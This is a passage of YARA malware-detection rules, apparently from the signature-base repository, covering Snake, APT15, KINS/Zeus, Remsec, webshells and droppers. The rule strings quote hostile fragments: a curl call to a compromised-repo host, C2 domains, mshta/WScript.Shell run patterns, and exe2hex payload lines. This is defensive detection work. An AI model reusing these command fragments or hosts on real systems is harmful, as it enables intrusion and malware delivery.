		$version_sig = { 48 57 8B F9 83 F8 4B 0F 87 5D 03 00 00 FF 24 }
		$decoder = { 80 B0 [4] ?? 40 3D 00 10 00 00 7C F1 }
		$xmrig_srcpath = "C:/Users/SKOL-NOTE/Desktop/Loader/script.go"
		$c2_1 = "ns7.softline.top" xor
		$c2_2 = "ns8.softline.top" xor
		$c2_3 = "ns9.softline.top" xor

	condition:
		$version_sig and $decoder and ( 2 of ( $c2_* ) or $xmrig_srcpath )
}

rule SIGNATURE_BASE_HKTL_Python_Sectools
{
	meta:
		description = "Detects code which uses the python lib sectools"
		author = "Arnim Rupp"
		id = "89a5e0ba-5547-53e4-84a3-d07ee779596e"
		date = "2023-01-27"
		modified = "2023-12-05"
		reference = "https://github.com/p0dalirius/sectools"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_susp_hacktool.yar#L18-L35"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "814ba1aa62bbb7aba886edae0f4ac5370818de15ca22a52a6ab667b4e93abf84"
		hash = "b3328ac397d311e6eb79f0a5b9da155c4d1987e0d67487ea681ea59d93641d9e"
		hash = "8cd205d5380278cff6673520439057e78fb8bf3d2b1c3c9be8463e949e5be4a1"
		logic_hash = "17f6897dc623f822c7ae6a7ae51714e78316d7b7fdf59b9f2f625ecaae939522"
		score = 50
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$import1 = "from sectools"
		$import2 = "import sectools"

	condition:
		any of ( $import* )
}

rule SIGNATURE_BASE_MAL_Github_Repo_Compromise_Myjino_Ru_Aug22
{
	meta:
		description = "Detects URL mentioned in report on compromised Github repositories in August 2022"
		author = "Florian Roth (Nextron Systems)"
		id = "1eaabad5-d0de-5d17-a5fa-3c638354843d"
		date = "2022-08-03"
		modified = "2023-12-05"
		reference = "https://twitter.com/stephenlacy/status/1554697077430505473"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_github_repo_compromise_myjino_ru.yar#L2-L15"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "5cbe6ee46a68d89b1e772762e29baa907458235cd014f20a0d0932e95c046f19"
		score = 90
		quality = 85
		tags = ""

	strings:
		$x1 = "curl http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide
		$x2 = "http__.Post(\"http://ovz1.j19544519.pr46m.vps.myjino.ru" ascii wide

	condition:
		1 of them
}

rule SIGNATURE_BASE_JS_Suspicious_Obfuscation_Dropbox
{
	meta:
		description = "Detects PowerShell AMSI Bypass"
		author = "Florian Roth (Nextron Systems)"
		id = "9b6b288d-3a15-5267-bbb1-885febf4df78"
		date = "2017-07-19"
		modified = "2023-12-05"
		reference = "https://twitter.com/ItsReallyNick/status/887705105239343104"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_scripts.yar#L19-L33"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "19d1dd25c4a5e18dca131709a64c3537278754ec9d67b0bb49bde9b1493d3dc7"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$x1 = "j\"+\"a\"+\"v\"+\"a\"+\"s\"+\"c\"+\"r\"+\"i\"+\"p\"+\"t\""
		$x2 = "script:https://www.dropbox.com" ascii

	condition:
		2 of them
}

rule SIGNATURE_BASE_JS_Suspicious_MSHTA_Bypass
{
	meta:
		description = "Detects MSHTA Bypass"
		author = "Florian Roth (Nextron Systems)"
		id = "b2ddca78-c19a-5bb6-a1c9-4413e637ab1d"
		date = "2017-07-19"
		modified = "2023-12-05"
		reference = "https://twitter.com/ItsReallyNick/status/887705105239343104"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_scripts.yar#L35-L50"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "df68cac0da19c5705353f26fc3f2a99556b7230f9d4f52e7a2e35cb48997b699"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "mshtml,RunHTMLApplication" ascii
		$s2 = "new ActiveXObject(\"WScript.Shell\").Run(" ascii
		$s3 = "/c start mshta j" ascii nocase

	condition:
		2 of them
}

rule SIGNATURE_BASE_Javascript_Run_Suspicious
{
	meta:
		description = "Detects a suspicious Javascript Run command"
		author = "Florian Roth (Nextron Systems)"
		id = "87f98ead-3052-5777-8877-574619173aaa"
		date = "2017-08-23"
		modified = "2023-12-05"
		reference = "https://twitter.com/craiu/status/900314063560998912"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_mal_scripts.yar#L52-L66"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "39d2292d3749c63780dc7ca7a2414ba02e2b0e1edec7ec6a16b42aba2c44c23a"
		score = 60
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "w = new ActiveXObject(" ascii
		$s2 = " w.Run(r);" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_RU_Snake_Indicators_May23_1
{
	meta:
		description = "Detects indicators found in Snake malware samples"
		author = "Florian Roth"
		id = "0d4fa8a7-447c-5905-bab9-b63de6209036"
		date = "2023-05-10"
		modified = "2025-03-21"
		reference = "https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_mal_ru_snake_may23.yar#L45-L80"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cb7a4ad2ee0868f17b6235f070e4c03e2394e3c252253f334b29ad26116b09e5"
		score = 85
		quality = 35
		tags = ""
		hash1 = "10b854d66240d9ee1ce4296d2f7857d2b1c6f062ca836d13d777930d678b3ca6"
		hash2 = "15ac5a61fb3e751045de2d7f5ff26c673f3883e326cd1b3a63889984a4fb2a8f"
		hash3 = "315ec991709eb45eccf724dfe31bccb7affcac7f8e8007e688ba8d02827205e0"
		hash4 = "417eb4fb9ada270af35562ff317807ac5ca9ee26181fe89990858f0944d3a6a7"
		hash5 = "48112970de6ea0f925f0657b30adcd0723df94afc98cfafdc991d70ad3602119"
		hash6 = "55ea557bcf4c143f20c616abe9075f7faafbf825aeef9ddb4f2b201acc44414b"
		hash7 = "6568bbeeb417e1111bf284e73152d90fe17e5497da7630ccddcbc666730dccef"
		hash8 = "81d620cb645006ffc9ac1b9d98a53aa286ae92b025bda075962079633f020482"
		hash9 = "888a3029b1b8b664eb1fc77dd511c4088a1e28ae5535a8683642bb3dca011d00"
		hash10 = "9027b4fef50b36289d630059425dc1137c88328329c3ea9dbc348dccd001adc0"
		hash11 = "9ac199572cab67433726976a0e9ba39d6feed1d567d6d230ebe3133df8dcb7fa"
		hash12 = "a64e5d872421991226ee040b4cd49a89ca681bdef4c10c4798b6c7b5c832c6df"
		hash13 = "b5d2da5eb57b5ab26edb927469552629f3cf43bbce2b1a128f6daac7cf57f6f7"
		hash14 = "bc15de1d1c6c62c0bf856e0368adabc4941e7b687a969912494c173233e6d28d"
		hash15 = "bdf94311313c39a3413464f623bd75a3db2eb05cc01090acd6dcd462a605eb4a"
		hash16 = "e4311892ae00bf8148a94fa900fc8e2c279a2acd3b4b4b4c3d0c99dd1d32353c"
		hash17 = "ed74288b367a93c6b47343bc696e751b9c465761ce9c4208901726baa758b234"
		hash18 = "ef1f1c7692b92a730f76b6227643b2d02a6e353af6e930166e3b48e3903e4ffd"
		hash19 = "f5e982b76af7f447742753f0b57eec3d7dd2e3c8e5506c35d4cf6c860b829f45"

	strings:
		$s1 = "\\\\.\\%s\\\\" ascii fullword
		$s2 = "read_peer_nfo" ascii fullword
		$s3 = "rcv_buf=%d%c" ascii fullword
		$s4 = "%s: (0x%08x)" ascii fullword
		$s5 = "no_impersonate" ascii fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Malware_Apt15_Royaldll
{
	meta:
		description = "DLL implant, originally rights.dll and runs as a service"
		author = "David Cannings"
		id = "26baef92-1055-56dc-b274-e2a6bc05d85b"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt15.yar#L196-L243"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "bc937f6e958b339f6925023bc2af375d669084e9551fd3753e501ef26e36b39d"
		logic_hash = "2ed0d38993a072da189f02233bd7cc0bf1be02e926f687db224f52de9b3a44fc"
		score = 75
		quality = 85
		tags = ""

	strings:
		$opcodes_jshash = { B8 A7 C6 67 4E 83 C1 02 BA 04 00 00 00 57 90 }
		$opcodes_encode = { 0F B6 1C 03 8B 55 08 30 1C 17 47 3B 7D 0C }
		$opcodes_sleep_loop = { 68 (88|B8) (13|0B) 00 00 FF D6 4F 75 F6 }
		$ = "Nwsapagent" fullword
		$ = "\"%s\">>\"%s\"\\s.txt"
		$ = "myWObject" fullword
		$ = "del c:\\windows\\temp\\r.exe /f /q"
		$ = "del c:\\windows\\temp\\r.ini /f /q"

	condition:
		3 of them
}

rule SIGNATURE_BASE_Malware_Apt15_Generic
{
	meta:
		description = "Find generic data potentially relating to AP15 tools"
		author = "David Cannings"
		id = "4eb50731-22df-5f7a-bf5f-166ef84cf8b5"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt15.yar#L285-L307"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "e939a5ab4a4b2b289d5809e18dd57dd85e3da19a176719adba4707dfd605fc81"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str01 = "myWObject" fullword
		$str02 = "myRObject" fullword
		$opcodes01 = { 6A (02|03) 6A 00 6A 00 68 00 00 00 C0 50 FF 15 }

	condition:
		2 of them
}

rule SIGNATURE_BASE_Payload_Exe2Hex
{
	meta:
		description = "Detects payload generated by exe2hex"
		author = "Florian Roth (Nextron Systems)"
		id = "c29e4937-cc6a-5265-a3b9-1018228dc956"
		date = "2016-01-15"
		modified = "2023-12-05"
		reference = "https://github.com/g0tmi1k/exe2hex"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/generic_exe2hex_payload.yar#L8-L28"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "91b738f0174a267bbc900d59abcb504d2ae0bac8c287c3b7d1ebfc57374a7ee7"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$a1 = "set /p \"=4d5a" ascii
		$a2 = "powershell -Command \"$hex=" ascii
		$b1 = "set+%2Fp+%22%3D4d5" ascii
		$b2 = "powershell+-Command+%22%24hex" ascii
		$c1 = "echo 4d 5a " ascii
		$c2 = "echo r cx >>" ascii
		$d1 = "echo+4d+5a+" ascii
		$d2 = "echo+r+cx+%3E%3E" ascii

	condition:
		all of ( $a* ) or all of ( $b* ) or all of ( $c* ) or all of ( $d* )
}

rule SIGNATURE_BASE_Redsails_PY
{
	meta:
		description = "Detects Red Sails Hacktool - Python"
		author = "Florian Roth (Nextron Systems)"
		id = "59d5e784-70ff-5061-9867-54c905ecfd8c"
		date = "2017-10-02"
		modified = "2023-12-05"
		reference = "https://github.com/BeetleChunks/redsails"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_redsails.yar#L27-L45"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4c5426a427e2c25cf9e44ae5f9ec477c9ab11f611d9a0db444c36e7cae176562"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		hash1 = "6ebedff41992b9536fe9b1b704a29c8c1d1550b00e14055e3c6376f75e462661"
		hash2 = "5ec20cb99030f48ba512cbc7998b943bebe49396b20cf578c26debbf14176e5e"

	strings:
		$x1 = "Gained command shell on host" fullword ascii
		$x2 = "[!] Received an ERROR in shell()" fullword ascii
		$x3 = "Target IP address with backdoor installed" fullword ascii
		$x4 = "Open backdoor port on target machine" fullword ascii
		$x5 = "Backdoor port to open on victim machine" fullword ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_Remsec_Executable_Blob_32
{
	meta:
		description = "Detects malware from Symantec's Strider APT report"
		author = "Symantec"
		id = "d7a7e57a-b117-5da8-a7a2-4c6351bd9072"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_strider.yara#L8-L20"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "1cfc43ab15b3d220a636c150315c30f5654e53fad67d20534ce4d5c00295e35e"
		score = 80
		quality = 85
		tags = ""

	strings:
		$code = { 31 06 83 C6 04 D1 E8 73 05 35 01 00 00 D0 E2 F0 }

	condition:
		all of them
}

rule SIGNATURE_BASE_Remsec_Executable_Blob_64
{
	meta:
		description = "Detects malware from Symantec's Strider APT report"
		author = "Symantec"
		id = "22345f40-3dae-5d5b-acc6-c67394475636"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_strider.yara#L22-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "957e5b6afabec3fb1b169dd85d0e950107e219f7dec8ef779a18bd90d9824a97"
		score = 80
		quality = 85
		tags = ""

	strings:
		$code = { 31 06 48 83 C6 04 D1 E8 73 05 35 01 00 00 D0 E2 EF }

	condition:
		all of them
}

rule SIGNATURE_BASE_Remsec_Executable_Blob_Parser
{
	meta:
		description = "Detects malware from Symantec's Strider APT report"
		author = "Symantec"
		id = "b2189bfe-7b84-5fe9-8829-64f49d1e2030"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_strider.yara#L36-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "2f6db962807c07ff1bbe8b53eeb386d7b0ac88f95b76439c0d8b65d597739bdd"
		score = 80
		quality = 85
		tags = ""

	strings:
		$code = { ( 0F 82 ?? ?? 00 00 | 72 ?? ) ( 80 | 41 80 ) ( 7? | 7C 24 ) 04 02 ( 0F 85 ?? ?? 00 00 | 75 ?? ) ( 81 | 41 81 ) ( 3? | 3C 24 | 7D 00 ) 02 AA 02 C1 ( 0F 85 ?? ?? 00 00 | 75 ?? ) ( 8B | 41 8B | 44 8B | 45 8B ) ( 4? | 5? | 6? | 7? | ?4 24 | ?C 24 ) 06 }

	condition:
		all of them
}

rule SIGNATURE_BASE_Remsec_Encrypted_Api
{
	meta:
		description = "Detects malware from Symantec's Strider APT report"
		author = "Symantec"
		id = "1aa3380b-d704-5eb9-b25d-f4bf20ae7179"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_strider.yara#L50-L62"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "4f10c24a8480c17c2939fe3fecba2820b22f8a47bc2b2e73ac1080a355025d7c"
		score = 80
		quality = 85
		tags = ""

	strings:
		$open_process = { 91 9A 8F B0 9C 90 8D AF 8C 8C 9A FF }

	condition:
		all of them
}

rule SIGNATURE_BASE_Remsec_Packer_A
{
	meta:
		description = "Detects malware from Symantec's Strider APT report"
		author = "Symantec"
		id = "d75198ab-b1ea-572a-a674-9a38c3e2958b"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_strider.yara#L64-L76"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "b46a41686fbf1c63e8a8b583859f23bf789bc9f11ee6b1fb01bb08e602772e76"
		score = 80
		quality = 85
		tags = ""

	strings:
		$code = { 69 ( C? | D? | E? | F? ) AB 00 00 00 ( 81 | 41 81 ) C? CD 2B 00 00 ( F7 | 41 F7 ) E? ( C1 | 41 C1 ) E? 0D ( 69 | 45 69 ) ( C? | D? | E? | F? ) 85 CF 00 00 ( 29 | 41 29 | 44 29 | 45 29 | 2B | 41 2B | 44 2B | 45 2B ) }

	condition:
		all of them
}

rule SIGNATURE_BASE_Remsec_Packer_B
{
	meta:
		description = "Detects malware from Symantec's Strider APT report"
		author = "Symantec"
		id = "18e7f84e-27f2-532d-9ead-0db6e9e6c0b2"
		date = "2016-08-08"
		modified = "2023-12-05"
		reference = "http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_strider.yara#L78-L90"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "9c63b5934d60b59a33364ef56c913220e59b9798a682a7f97e6755270adf4e4b"
		score = 80
		quality = 85
		tags = ""

	strings:
		$code = { 48 8B 05 ?? ?? ?? ?? 48 89 44 24 ?? 48 8B 05 ?? ?? ?? ?? 48 8D 4C 24 ?? 48 89 44 24 ?? 48 8D ( 45 ?? | 84 24 ?? ?? 00 00 ) ( 44 88 6? 24 ?? | C6 44 24 ?? 00 ) 48 89 44 24 ?? 48 8D ( 45 ?? | 84 24 ?? ?? 00 00 ) C7 44 24 ?? 0? 00 00 00 2B ?8 48 89 ?C 24 ?? 44 89 6? 24 ?? 83 C? 08 89 ?C 24 ?? ( FF | 41 FF ) D? ( 05 | 8D 88 ) 00 00 00 3A }

	condition:
		all of them
}

rule SIGNATURE_BASE_KINS_Dropper
{
	meta:
		description = "Match protocol, process injects and windows exploit present in KINS dropper"
		author = "AlienVault Labs aortega@alienvault.com"
		id = "17e12685-aaad-5d83-949c-43d5aef1ef0d"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/arPhm3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_kins_dropper.yar#L1-L26"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "cdab93f823e13e0c3104de8e05cb1572f83fb5294f359698092d73fc7983955b"
		score = 75
		quality = 85
		tags = ""

	strings:
		$n1 = "tid=%d&ta=%s-%x" fullword
		$n2 = "fid=%d" fullword
		$n3 = "%[^.].%[^(](%[^)])" fullword
		$i0 = "%s [%s %d] 77 %s"
		$i01 = "Global\\%s%x"
		$i1 = "Inject::InjectProcessByName()"
		$i2 = "Inject::CopyImageToProcess()"
		$i3 = "Inject::InjectProcess()"
		$i4 = "Inject::InjectImageToProcess()"
		$i5 = "Drop::InjectStartThread()"
		$uac1 = "ExploitMS10_092"
		$uac2 = "\\globalroot\\systemroot\\system32\\tasks\\" ascii wide
		$uac3 = "<RunLevel>HighestAvailable</RunLevel>" ascii wide

	condition:
		2 of ( $n* ) and 2 of ( $i* ) and 2 of ( $uac* )
}

rule SIGNATURE_BASE_KINS_DLL_Zeus
{
	meta:
		description = "Match default bot in KINS leaked dropper, Zeus"
		author = "AlienVault Labs aortega@alienvault.com"
		id = "968ada06-c8a1-5053-95de-10aa484231cb"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://goo.gl/arPhm3"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/crime_kins_dropper.yar#L28-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "bd1ebe7976d1f93856b4f8d1d62d8fff68ce6234204da9fbdc233ddbef56864d"
		score = 75
		quality = 60
		tags = ""

	strings:
		$n1 = "%BOTID%" fullword
		$n2 = "%opensocks%" fullword
		$n3 = "%openvnc%" fullword
		$n4 = /Global\\(s|v)_ev/ fullword
		$s1 = "\x72\x6E\x6D\x2C\x36\x7D\x76\x77"
		$s2 = "\x18\x04\x0F\x12\x16\x0A\x1E\x08\x5B\x11\x0F\x13"
		$s3 = "\x39\x1F\x01\x07\x15\x19\x1A\x33\x19\x0D\x1F"
		$s4 = "\x62\x6F\x71\x78\x63\x61\x7F\x69\x2D\x67\x79\x65"
		$s5 = "\x6F\x69\x7F\x6B\x61\x53\x6A\x7C\x73\x6F\x71"

	condition:
		all of ( $n* ) and 1 of ( $s* )
}

rule SIGNATURE_BASE_Oracle_Data
{
	meta:
		description = "Chinese Hacktool Set - file oracle_data.php"
		author = "Florian Roth (Nextron Systems)"
		id = "faa62dcc-0f59-573c-8722-d07216de151f"
		date = "2015-06-13"
		modified = "2023-12-05"
		reference = "http://tools.zjqhr.com/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_cn_webshells.yar#L123-L138"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6cf070017be117eace4752650ba6cf96d67d2106"
		logic_hash = "1ab9b6c4349dd891103a24a77c93c2abb784d3ed616523f3aaec68b05082983e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$txt=fopen(\"oracle_info.txt\",\"w\");" fullword ascii
		$s1 = "if(isset($_REQUEST['id']))" fullword ascii
		$s2 = "$id=$_REQUEST['id'];" fullword ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Hunting_Rule_Shikataganai
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "Steven Miller"
		id = "fe266a42-0480-5a98-9368-8a18aa5e4f69"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/gen_shikataganai.yar#L1-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		logic_hash = "733522cb1d61f4bbb300d73ff21d9d7d10a78aae06e03408fce4b88e4c51f662"
		score = 50
		quality = 85
		tags = ""
		company = "FireEye"

	strings:
		$varInitializeAndXorCondition1_XorEAX = { B8 ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 59 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 40 | 41 | 42 | 43 | 45 | 46 | 47 ) ?? }
		$varInitializeAndXorCondition1_XorEBP = { BD ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5B | 5C | 5E | 5F ) [0-50] 31 ( 68 | 69 | 6A | 6B | 6D | 6E | 6F ) ?? }
		$varInitializeAndXorCondition1_XorEBX = { BB ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5C | 5D | 5E | 5F ) [0-50] 31 ( 58 | 59 | 5A | 5B | 5D | 5E | 5F ) ?? }
		$varInitializeAndXorCondition1_XorECX = { B9 ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 48 | 49 | 4A | 4B | 4D | 4E | 4F ) ?? }
		$varInitializeAndXorCondition1_XorEDI = { BF ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5A | 5B | 5C | 5D | 5E ) [0-50] 31 ( 78 | 79 | 7A | 7B | 7D | 7E | 7F ) ?? }
		$varInitializeAndXorCondition1_XorEDX = { BA ?? ?? ?? ?? [0-30] D9 74 24 F4 [0-10] ( 58 | 59 | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 50 | 51 | 52 | 53 | 55 | 56 | 57 ) ?? }
		$varInitializeAndXorCondition2_XorEAX = { D9 74 24 F4 [0-30] B8 ?? ?? ?? ?? [0-10] ( 59 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 40 | 41 | 42 | 43 | 45 | 46 | 47 ) ?? }
		$varInitializeAndXorCondition2_XorEBP = { D9 74 24 F4 [0-30] BD ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5B | 5C | 5E | 5F ) [0-50] 31 ( 68 | 69 | 6A | 6B | 6D | 6E | 6F ) ?? }
		$varInitializeAndXorCondition2_XorEBX = { D9 74 24 F4 [0-30] BB ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5C | 5D | 5E | 5F ) [0-50] 31 ( 58 | 59 | 5A | 5B | 5D | 5E | 5F ) ?? }
		$varInitializeAndXorCondition2_XorECX = { D9 74 24 F4 [0-30] B9 ?? ?? ?? ?? [0-10] ( 58 | 5A | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 48 | 49 | 4A | 4B | 4D | 4E | 4F ) ?? }
		$varInitializeAndXorCondition2_XorEDI = { D9 74 24 F4 [0-30] BF ?? ?? ?? ?? [0-10] ( 58 | 59 | 5A | 5B | 5C | 5D | 5E ) [0-50] 31 ( 78 | 79 | 7A | 7B | 7D | 7E | 7F ) ?? }
		$varInitializeAndXorCondition2_XorEDX = { D9 74 24 F4 [0-30] BA ?? ?? ?? ?? [0-10] ( 58 | 59 | 5B | 5C | 5D | 5E | 5F ) [0-50] 31 ( 50 | 51 | 52 | 53 | 55 | 56 | 57 ) ?? }

	condition:
		any of them
}

rule SIGNATURE_BASE_EXT_APT32_Goopdate_Installer
{
	meta:
		description = "Detects APT32 installer side-loaded with goopdate.dll"
		author = "Facebook"
		id = "08f3cbda-ccb7-517a-b205-5f71de26c735"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://about.fb.com/news/2020/12/taking-action-against-hackers-in-bangladesh-and-vietnam/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/apt_apt32.yar#L3-L20"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "69730f2c2bb9668a17f8dfa1f1523e0e1e997ba98f027ce98f5cbaa869347383"
		logic_hash = "1dcb3009c5c19ff4e54d82d3a4b99b3431e78664f1660522a781e815d96958c4"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = { 68 ?? ?? ?? ?? 57 A3 ?? ?? ?? ?? FF D6 33 05 ?? ?? ?? ?? }
		$s1 = "GetProcAddress"
		$s2 = { 8B 4D FC ?? ?? 0F B6 51 0C ?? ?? 8B 4D F0 0F B6 1C 01 33 DA }
		$s3 = "FindNextFileW"
		$s4 = "Process32NextW"

	condition:
		(pe.is_64bit ( ) or pe.is_32bit ( ) ) and all of them
}

rule SIGNATURE_BASE_APT_HAFNIUM_Forensic_Artefacts_Mar21_1
{
	meta:
		description = "Detects forensic artefacts found in HAFNIUM intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "872822b0-34d9-5ae4-a532-6a8786494fa9"
		date = "2021-03-02"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
